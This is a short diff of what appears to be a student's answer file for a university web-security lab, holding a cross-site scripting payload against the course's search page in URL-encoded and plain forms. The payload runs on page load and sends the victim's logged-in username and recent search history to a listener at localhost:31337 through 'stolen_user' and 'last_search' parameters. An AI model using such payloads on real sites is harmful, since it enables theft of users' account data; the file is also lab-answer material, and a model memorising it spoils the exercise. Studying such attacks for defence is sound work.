@@ -1,6 +1,1 @@
-xss_3 ENCODED:
 https://project2.ecen4133.org/search?xssdefense=3&q=<script>$(window).load(function(){window.location=`http://localhost:31337/?stolen_user=`%2B$(`%23logged-in-user`).text()%2B`	%26last_search=`%2B$(`%23history-list`).children()[1].innerHTML})</script>
-
-
-xss_3 PLAIN:
-https://project2.ecen4133.org/search?xssdefense=2&q=<script>$(window).load(function(){window.location=`http://localhost:31337/?stolen_user=`+$(`#logged-in-user`).text()+`	&last_search=`+$(`#history-list`).children()[1].innerHTML})</script>
